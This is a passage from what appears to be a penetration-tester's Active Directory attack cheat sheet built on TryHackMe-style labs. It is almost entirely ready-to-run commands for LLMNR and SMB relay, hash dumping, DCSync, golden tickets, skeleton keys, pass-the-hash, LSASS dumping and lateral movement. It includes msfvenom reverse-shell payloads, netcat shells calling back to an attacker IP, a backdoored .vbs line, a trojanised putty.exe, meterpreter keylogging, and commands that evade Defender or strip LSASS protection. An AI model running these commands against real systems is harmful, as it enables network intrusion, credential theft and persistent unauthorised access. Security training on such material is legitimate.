- Setup Responder to create a spoofed WPAD proxy server
  - `sudo responder -I tun0 -wv`
  
  
#### LAPS and PXE

- [Taking over Windows Workstations thanks to LAPS and PXE](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)
- [PowerPXE](https://github.com/wavestone-cdt/powerpxe)
- [TryHackMe task 6 Breaching AD](https://tryhackme.com/room/breachingad)
1. `tftp -i $IP GET "\Tmp\x64{39...28}.bcd" conf.bcd`
2. `Import-Module .\PowerPXE.ps1`
3. `$BCDFile = "conf.bcd"`
4. `Get-WimFile -bcdFile $BCDFile`
5. `tftp -i $IP GET "<PXE Boot Image Location>" pxeboot.wim`
6. `Get-FindCredentials -WimFile pxeboot.wim`


#### LLMNR Poisoning

- It is possible that when you run nmap, or simply have traffic, you may receive communications. Use responders to capture hashes
1. `sudo responder -I tun0 -rdwv`
2. Listen to the traffic
3. Get the hash
4. crack the hash
   - `hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt -o cracked.txt -O`


#### SMB Relay

- Requirements for attack: SMB signing must be disabled on the target; Relayed user credentials must be admin on the machine.
  - Discovery: `nmap --script=smb2-security-mode.nse -p445 192.168.220.0/24`
1. Turn off SMB and HTTP from the file `/usr/share/responder/Responder.conf`
2. `sudo responder -I tun0 -rdwv`
3. `sudo impacket-ntlmrelayx -tf targets.txt -smb2support`
   - add the flag `-i` to get an interactive smb shell; connect with netcat `nc 127.0.0.1 1100`
   - add the flag `-c` to run a command, like `whoami`
   - add the flag `-e` to execute something, like a payload generated with msfvenom
4. Capture SAM hashes


#### IPv6 DNS Attacks

1. `mitm6 -d domain.local`
2. `sudo impacket-ntlmrelayx -6 -t ldaps://192.168.57.140 -wh fakewpad.domain.local -l lootme`
   - `-t ldaps://DOMAIN-CONTROLLER-IP`; change only the ip in this command
3. see the results in the directory 'lootme' for ntlmrelayx
4. for mitm6, if an admin logs in, it might succed in creating a new user
- See also: [The worst of both worlds: Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)


#### MFP Hacking

- See: [How to Hack Through a Pass-Back Attack: MFP Hacking Guide](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)


#### Dump hashes

- `impacket-secretsdump spookysec/backup:backup2517860@10.10.3.105`
- `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`
  - `SYSTEM` is also a file you have to get
    - `SYSTEM` or `system.hive`
- you can also run
  1. `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > hashes.txt`
  2. `cat hashes.txt | cut -d ':' -f 4 > pothashes.txt`
  3. `gedit pothashes.txt`


#### Microsoft password automation decrypt

1. `$pw = "01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b" | ConvertTo-SecureString`
2. `$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)`
3. `$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)`
4. `echo $UnsecurePassword`


#### Full control / Write privileges over a template (ESC4)

1. `certipy-ad req -username jodie.summers -password 'hHO_S9gff7ehXw' -target nara-security.com -ca NARA-CA -template NARAUSER -upn administrator@nara-security.com -dc-ip 192.168.234.30 -debug`
2. `certipy-ad auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.234.30`


#### WriteDACL

- If you find that your user or the group wich your user is part of has this right, follow these steps
1. `net user john abc123$ /add /domain`
2. `net group "Exchange Windows Permissions" john /add`
3. `net localgroup "Remote Management Users" john /add`
4. `When using evil-winrm, run the command 'Bypass-4MSI' to evade defender`
5. `iex(new-object net.webclient).downloadString('http://10.10.14.30/PowerView.ps1')`
6. `$pass = convertto-securestring 'abc123$' -asplain -force`
7. `$cred = new-object system.management.automation.pscredential('htb\john', $pass)`
8. `Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync`
9. Proceed with DCSync using `john:abc123$`


#### Azure AD (AAD) Sync service

- See: 
  - https://blog.xpnsec.com/azuread-connect-for-redteam/
  - https://github.com/dirkjanm/adconnectdump
  - https://app.hackthebox.com/machines/223
1. Extract password with [azuread_decrypt_msol.ps1](https://gist.github.com/analyticsearch/7453d22d737e46657eb57c44d5cf4cbb)
2. If it doesn't work, retrieve `$key_id`, `$instance_id` and `$entropy` with the following command (see also [azuread_decrypt_msol_v2.ps1](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c))
   - `sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"`


#### Group Policy Preferences (GPP) AKA MS14-025

1. `smbclient \\\\10.10.10.100\\Replication`
2. `prompt off`
3. `recurse on`
4. `mget *`
   - focus on the files: `Groups.xml`, `Registry.pol`, `GPE.INI`, `GptTmpl.inf`
     - use the command `tree` to explore better the directory
- `gpp-decrypt edBSH0whZlTJt/QS93jjcJ89mjWa89gc8guK0hK0dcqh+ZGMeX0sQbCiheijtlFCuNH9pG8sDVYdYw/NglVmQ`
- read Registry.pol
  - `regpol Registry.pol`
  - `Parse-PolFile -Path Registry.pol`


#### Dump NTDS.dit

- No creds, access on DC: `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`
  - `root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local`
- Disk shadow, see: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration#no-credentials-diskshadow
- With credentials: `impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6`
- More: https://www.hackingarticles.in/credential-dumping-ntds-dit/



#### Exploiting Domain Trust

1. With mimikatz, recover the KRBTGT password hash
   - `privilege::debug`
   - `lsadump::dcsync /user:za\krbtgt`
2. With PowerShell, recover the SID of the child domain controller
   - `Get-ADComputer -Identity "THMDC"`
3. With PowerShell, recover the SID of the Enterprise Admins
   - `Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc`
4. With mimikatz, create forged TGT
   - `kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt`
5. Verify the golden ticket > after that you can use Rubeus.exe
   - `dir \\thmdc.za.tryhackme.loc\c$`
   

#### AddMember + ForceChangePassword

1. Add our AD account to the IT Support group
   - `Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"`
   - Verify the result with: `Get-ADGroupMember -Identity "IT Support"`
   - At this point you should have inherited 'ForceChangePassword' Permission Delegation
2. Identify the members of the group to select a target. Since the network is shared, it might be best to select one further down in the list
   - `Get-ADGroupMember -Identity "Tier 2 Admins"`  
3. `$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force`
   - `Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password`

- If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. You could also run 'gpupdate /force' and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.
- See [Exploiting AD Task 2](https://tryhackme.com/room/exploitingad)


#### Automated Relays

- With BloodHound, find instances where a computer has the "AdminTo" relationship over another computer
  - `MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`
- A requirement is SMB signing enabled, check it with the following command
  - `nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc`
Abuse Print Spooler Service
- Determine if the Print Spooler service is running
  - `GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc`
- Set up NTLM relay
  - `impacket-ntlmrelayx -smb2support -t smb://"THMSERVER1 IP" -debug`
  - `impacket-ntlmrelayx -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug`
- `SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"`

Keylogging

1. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1`
2. `sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit"`

From the victim
1. `certutil.exe -urlcache -split -f http://IP/shell.ps1`

From Meterpreter
1. `ps | grep "explorer"`
2. `migrate PID`
3. `getuid`
4. `keyscan_start`
5. `keyscan_dump`


#### GenericAll

[GenericAll on user](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-user)
1. `. .\PowerView.ps1`
2. `Get-ObjectAcl -SamAccountName L.Livingstone | ? {$_.ActiveDirectoryRights -eq "GenericAll"}`
3. See GenericAll also in other ways and for groups

[GenericAll on group](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-group)
1. `Get-NetGroup "domain admins"`
2. `Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=resourced,DC=local"}`
3. `net group "domain admins" L.Livingstone /add /domain`

Scenario: you can't access a shell with found credentials
1. run `bloodhound.py`
2. if you've found a GenericAll to a group that can PSremote, run the following command from 'ldeep' https://github.com/franc-pentest/ldeep
   - `ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"`



#### Kerberos Delegation

Resourced Based Constrained Delegation attack
- Requirement: GenericAll on system
1. `impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.174.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'`
2. `python3 /home/kali/Documents/windows-attack/Scripts/rbcd-attack/rbcd.py -dc-ip 192.168.174.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone`
3. `impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.174.175`
4. `export KRB5CCNAME=./Administrator.ccache`
5. `sudo echo '192.168.174.175 resourcedc.resourced.local' >> /etc/hosts`
6. `impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.174.175`

Another way to do it
1. Enumerate available delegations
   - `Import-Module C:\Tools\PowerView.ps1`
   - `Get-NetUser -TrustedToAuth`
2. Get Administrator role, dump secrets to get passwords for target account
   - `token::elevate`
   - `lsadump::secrets`
3. Exit mimikatz > enter Kekeo
4. Generate a TGT to generate tickets for HTTP and WSMAN services
   - `tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted`
5. Forge TGS requests for the account we want to impersonate (for HTTP and WSMAN)
   - `tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc`
   - `tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc`
6. Exit Kekeo > Open Mimikatz to import the TGS tickets
   - `privilege::debug`
   - `kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`
   - `kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`
7. Exit mimikatz, run `klist` to verify that everything went fine
8. `New-PSSession -ComputerName thmserver1.za.tryhackme.loc`
9. `Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc`
10. `whoami`


#### Kerberos Backdoors / Kerberos Skeleton

1. `privilege::debug`
2. `misc::skeleton`
Accessing the forest
- the default password is 'mimikatz', some examples:
  - `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
  - `dir \\Desktop-1\c$ /user:Machine1 mimikatz`


#### Testing found credentials

- `crackmapexec smb 192.168.174.187 -u usernames.txt -p passwords.txt --continue-on-success`
  - test `impacket-psexec` on success
- `crackmapexec winrm 192.168.212.165 -u users.txt -p passwords.txt --continue-on-success`
  - test `evil-winrm` on success
- `crackmapexec smb 192.168.174.187 -u usernames.txt -H hashes.txt --continue-on-success`
  - test the found hashes
- `runas.exe /netonly /user:<domain>\<username> cmd.exe`
- `xfreerdp /u:bitbucket /p:littleredbucket /cert:ignore /v:10.10.187.9`
- Note for post exploitation: you might find an `.xml` like `username.xml`. To test it:
  1. `$Credential = Import-Clixml -Path ./username.xml`
  2. `$Credential.GetNetworkCredential().password`
  - The last commnad, try it even randomly before saving something in `$credential`, you never know


#### <ins>Lateral Movement Techniques and Pivoting</ins>

- See: https://tryhackme.com/room/lateralmovementandpivoting
- `psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe`
- `winrs.exe -r:THMIIS.za.tryhackme.com cmd`

#### WMI and WinRM

1. Create a PSCredential object that stores session's username and password
   ```PowerShell
   $username = '<username>';
   $password = '<password>';
   $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
   $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
   ```
2. Create a Common Information Model
   ```PowerShell
   $options = New-CimSessionOption -Protocol DCOM
   $session = New-Cimsession -ComputerName <IP> -Credential $credential -SessionOption $options
   $command = 'calc';
   ```
3. Tie all together with `Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};`

Another lateral movement
- `winrs -r:<target> -u:<username> -p:<password>  "cmd /c hostname & whoami"`
- `winrs -r:<target> -u:<username> -p:<password>  "powershell -nop -w hidden -e <BASE64>"`

PowerShell remoting
```PowerShell
$username = '<username>';
$password = '<password>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <IP> -Credential $credential
```
- To interact with the session, run the command `Enter-PSSession <SESSION-ID>`

**Connecting to WMI From Powershell, another process**
- Create a PSCredential object
  ```PowerShell
  $username = 'Administrator';
  $password = 'Mypass123';
  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
  ```
- Enstablish a connection
  - `Enter-PSSession -Computername TARGET -Credential $credential`
  - `Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}`
  - ```PowerShell
    $Opt = New-CimSessionOption -Protocol DCOM
    $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
    $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
    Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
    ```
- Same process done with wmic.exe
  - `wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"`
  - `winrs.exe -u:Administrator -p:Mypass123 -r:target cmd`
- Create Services Remotely with WMI
  - `Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{Name = "THMService2";DisplayName = "THMService2";PathName = "net user munra2 Pass123 /add";ServiceType = [byte]::Parse("16");StartMode = "Manual" }`
  - `$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"`
  - `Invoke-CimMethod -InputObject $Service -MethodName StartService`
  - Stop and delete service
    ```PowerShell
    Invoke-CimMethod -InputObject $Service -MethodName StopService
    Invoke-CimMethod -InputObject $Service -MethodName Delete
    ```

**Creating Scheduled Tasks Remotely with WMI**
- ```PowerShell
  $Command = "cmd.exe"
  $Args = "/c net user munra22 aSdf1234 /add"
  $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
  Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
  Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
  Delete unscheduled task
  ```
- Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"

**Example with WMI**
1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.46.25 LPORT=4445 -f msi > myinstaller.msi`
2. `smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994`
3. `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.46.25; set LPORT 4445;exploit"`
4. ```PowerShell
   $username = 't1_corine.waters';
   $password = 'Korine.1994';
   $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
   $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
   $Opt = New-CimSessionOption -Protocol DCOM
   $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
   ```
5. `Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}`

#### Remotely Creating Services Using sc
```Powershell
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add"
start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

#### Creating Scheduled Tasks Remotely
```Powershell
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "THMtask1" 
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

#### Spawn process remotely
1. `msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.46.25 LPORT=4444 -o myservice.exe`
2. `smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever`
3. `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.46.25; set LPORT 4444;exploit"`
4. `nc -lvp 4443`

From the new shell on the listener
5. `runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.46.25 4443"`
6. `sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto`
7. `sc.exe \\thmiis.za.tryhackme.com start THMservice-3249`


#### Backdooring .vbs Scripts
- `CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True`

#### Backdooring .exe Files
- `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`

#### RDP hijacking
1. Run `cmd` as Administrator
2. `PsExec64.exe -s cmd.exe`
3. List server's sessions with '`query user`'
4. Use `tscon.exe` and specify the `session ID` we will be taking over, as well as our current `SESSIONNAME`
   - `tscon 3 /dest:rdp-tcp#6`
   
#### SSH Remote Port Forwarding
- Victim: `ssh attacker@10.50.46.25 -R 3389:3.3.3.3:3389 -N`
- Attacker: `xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword`

#### SSH Local Port Forwarding (to expose attacker's port 80)

Victim
1. `ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N`
2. ```Powershell
   add firewall rule
   netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
   ```
   
#### Port Forwarding With socat
1. Open port `1234` and redirect to port `4321` on host `1.1.1.1`
   ```Powershell
   socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
   ```
2. `netsh advfirewall firewall add rule name="Open Port 1234" dir=in action=allow protocol=TCP localport=1234`
- To expose attacker's port `80`: `socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80`
- Example
  ```Powershell
  socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
  xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
  ```

#### Dynamic Port Forwarding and SOCKS
- Victim: `ssh attacker@10.50.46.25 -R 9050 -N`
- Attacker: 
  1. ```
     [ProxyList]
     socks4  127.0.0.1 9050
	 ```
  2. `proxychains curl http://pxeboot.za.tryhackme.com`

#### Rejetto HFS
1. `ssh tunneluser@10.50.46.25 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N`
2. `windows/http/rejetto_hfs_exec`
- See: [Task 7 "Tunnelling Complex Exploits"](https://tryhackme.com/room/lateralmovementandpivoting)

#### PsExec
```PowerShell
./PsExec64.exe -i  \\<TARGET> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
```
Requirements
- The user that authenticates to the target machine needs to be part of the Administrators local group
- An SMB connection through the firewall
- The `ADMIN$` share must be available
- File and Printer Sharing has to be turned on

#### Pass the Hash
```PowerShell
/usr/bin/impacket-wmiexec -hashes :<hash> <username>@<IP>
```

1. Extract hashes
   ```PowerShell
   lsadump::sam
   sekurlsa::msv
   ```
3. Perform the PtH
   ```PowerShell
   token::revert
   sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
   ```
4. On the reverse shell
   ```PowerShell
   winrs.exe -r:THMIIS.za.tryhackme.com cmd
   ```

Requirements
- An SMB connection through the firewall
- The `ADMIN$` share must be available
- The attacker must present valid credentials with local administrative permission

#### Pass the Key / Overpass the Hash

1. Run the Notepad with `Run as different user` to cache the credentials on the machine
2. Run mimikatz. Execute the commands `privilege::debug` and `sekurlsa::logonpasswords` to dump the password hash for the user just used
3. Now, in mimikatz, execute the command `sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell` to run a PowerShell
4. Authenticate to a network share of the target `net use \\<target>`
5. Use `klist` to notice the newly requested Kerberos tickets, including a TGT and a TGS for the Common Internet File System (CIFS)
6. Now you can run `.\PsExec.exe \\<target> cmd`

Process
1. `sekurlsa::ekeys` 
2. RC4 hash
   ```PowerShell
   sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
   AES128 hash
   sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
   AES256 hash
   sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
   ```
4. On the reverse shell
   ```PowerShell
   winrs.exe -r:THMIIS.za.tryhackme.com cmd
   ```

#### Pass the Ticket

1. Run mimikatz. Execute `#privilege::debug`
2. `sekurlsa::tickets /export` export all the TGT/TGS from memory
3. Verify generated tickets with `PS:\> dir *.kirbi`. Search for an administrator ticket in the local directory
4. Inject a ticket from mimikatz with `kerberos::ptt <ticket_name>`
   - Example: `kerberos::ptt [0;193553]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`
5. Inspect the injected ticket with `C:\> klist`
6. Access the restricted shared folder.
   - Example `dir \\192.168.179.128\admin$`

#### DCOM

1. `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))` remotely Instantiate the MMC Application object
2. `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")` execute a command on the remote DCOM object
3. `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64>","7")` reverse shell, run a listener with `nc -lnvp 443`


### <ins>Credentials Harvesting</ins>

#### Cedential Access


Clear-text files
- `C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Database files
- `cd C:\ProgramData\McAfee\Agent\DB > ma.db > sqlitebrowser ma.db`
- [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption/)

Memory
- Clear-text credentials
- Cached Passwords
- AD Tickets

Password managers
- example: `*.kdbx`

Enterprise Vaults

Active Directory
- Users' description
- Group Policy SYSVOL
- NTDS
- AD Attacks

Network Sniffing

Registry
- `reg query HKLM /f password /t REG_SZ /s`
- `reg query HKCU /f password /t REG_SZ /s`


#### Windows Credentials

- Keystrokes (keyscan_start / keyscan_stop)
- `copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\`
- `meterpreter > hashdump`

Shadow Copy Service
1. `wmic shadowcopy call create Volume='C:\'`
2. `vssadmin list shadows`
3. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam`
4. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system`

Registry Hives
1. `reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg`
2. `reg save HKLM\system C:\users\Administrator\Desktop\system-reg`

Now, you can decrypt
- copy the files with `scp username@remoteHost:/remote/dir/file.txt /local/dir/`
- `impacket-secretsdump -sam /tmp/sam-reg -system /tmp/system-reg LOCAL`


#### Dump LSASS

GUI
1. Open Task Manager
2. Search for `lsass.exe` > right click "Create dump file"
3. `copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP`

Mimikatz
1. `privilege::debug`
2. `sekurlsa::logonpasswords`

Protected LSASS
1. `privielege::debug`
2. `!+`
3. `!processprotect /process:lsass.exe /remove`
4. `sekurlsa::logonpasswords`
   
   
#### Accessing Credential Manager

1. `vaultcmd /list`
2. `VaultCmd /listproperties:"Web Credentials"`
3. `VaultCmd /listcreds:"Web Credentials"`

RunAs
1. `cmdkey /list`
2. If it's not empty
   - `runas /savecred /user:THM.red\thm-local cmd.exe`
   
Mimikatz
1. `privilege::debug`
2. `sekurlsa::credman`


#### Domain Controller

1. `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`
2. `impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit local`
3. `impacket-secretsdump -just-dc THM.red/<AD_Admin_User>@10.10.153.149`
   - `impacket-secretsdump -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.153.149`
4. `hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`


#### Local Administrator Password Solution (LAPS)

1. Verify if there is LAPS in the machine
   - `dir "C:\Program Files\LAPS\CSE"`
2. `Get-Command *AdmPwd*`
3. Find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS
   - `Find-AdmPwdExtendedRights -Identity THMorg`
   - `Find-AdmPwdExtendedRights -Identity *`
4. Cheeck the group and its members
   - `net groups "TARGET GROUP"`
   - `net user test-admin`
5. Compromise one of those accounts, get the password
   - `runas.exe /netonly /user:bk-admin cmd.exe`
   - `Get-AdmPwdPassword -ComputerName creds-harvestin`
   
#### Rubeus Harvesting

- `Rubeus.exe harvest /interval:30`


#### <ins>Active Directory Persistence</ins>

#### Golden Ticket

- With this attack, you can gain access to every machine in the AD
- You need a kerberoast ticket granting account and With mimikatz from the DC
- You may need to purge: `kerberos::purge`
- See this if you are having trouble: https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html

Process
1. `privilege::debug`
2. Dump the krbtgt hash
   - `lsadump::lsa /inject /name:krbtgt or `lsadump::lsa /patch`
   - copy the SID and the NTLM
3. `kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM> /ptt`
4. `misc::cmd`
5. from the opened CMD, try `dir \\USERNAME\\C$`
   - consider also to download psexec in the machine compromised for more access
   - `psexec.exe \\USERNAME cmd.exe`


#### Shadow copies

1. `vshadow.exe -nw -p  C:` perform a shadow copy of the `C:` drive
2. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak` copy the ntds database to the C: drive
3. `reg.exe save hklm\system c:\system.bak` save the SYSTEM hive from the Windows registry
4. `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL` extract the credential materials

#### Through Credentials

1. DCSync All with mimikatz
   - `privilege::debug`
   - `log <username>_dcdump.txt`
   - `lsadump::dcsync /domain:za.tryhackme.loc /all`
2. `cat <username>_dcdump.txt | grep "SAM Username"`
3. `cat <username>_dcdump.txt | grep "Hash NTLM"`
- You can also target only one user with the following command
  - `lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>`
  

#### Through Certificates

1. See certificates stored
   - `crypto::certificates /systemstore:local_machine`
2. Patch memory to make these keys exportable
   - `crypto::capi`
   - `crypto::cng`
3. Export the certificates
   - `crypto::certificates /systemstore:local_machine /export`
4. Generate certificates
